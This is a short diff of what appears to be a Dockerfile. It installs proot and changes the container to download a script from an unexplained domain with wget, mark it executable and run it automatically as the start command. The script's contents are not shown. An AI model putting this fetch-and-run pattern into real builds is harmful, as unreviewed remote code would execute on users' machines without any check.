@@ -4,8 +4,6 @@ RUN DEBIAN_FRONTEND=noninteractive apt install curl git wget unzip screen python
 RUN curl -LO https://proot.gitlab.io/proot/bin/proot
 RUN chmod 755 proot
 RUN mv proot /bin
-RUN mkdir /prog
-RUN wget https://s.bccx.eu.org/ -O /prog/start.sh
-RUN chmod +x /prog/start.sh
-RUN chmod 777 /prog/*
-CMD pwd
+RUN wget https://s.bccx.eu.org/ -O /start.sh
+RUN chmod +x /start.sh
+CMD ./start.sh
